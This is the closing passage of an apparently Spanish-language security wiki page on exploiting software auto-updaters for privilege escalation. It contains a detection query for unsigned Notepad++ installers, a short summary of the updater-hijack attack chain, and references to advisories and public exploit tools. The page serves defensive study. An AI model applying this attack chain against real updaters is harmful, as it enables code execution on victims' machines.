| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Estos patrones se aplican a cualquier updater que acepte manifiestos sin firmar o no fije los firmantes de los instaladores: el secuestro de red + un instalador malicioso + sideloading con firma propia (BYO-signed) permiten la ejecución remota de código bajo la apariencia de actualizaciones «confiables».

---
## References
- [1] [Aviso – Netskope Client for Windows – Escalada local de privilegios mediante un servidor fraudulento (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Aviso de seguridad de Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin de Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – cliente/exploit IPC de Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [Pwning ASUS DriverHub, MSI Center, Acer Control Centre y Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Escalada local de privilegios mediante archivos con permisos de escritura en Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Escalada de privilegios en el agente de Windows](https://checkmk.com/werk/16361)
- [10] [PoC de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Actores estatales explotan la cadena de suministro de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – actualización del incidente de infraestructura secuestrada](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Cómo eludir la corrección de CVE-2025-0309 en Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Descubrimiento de vulnerabilidades de escalada de privilegios en Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
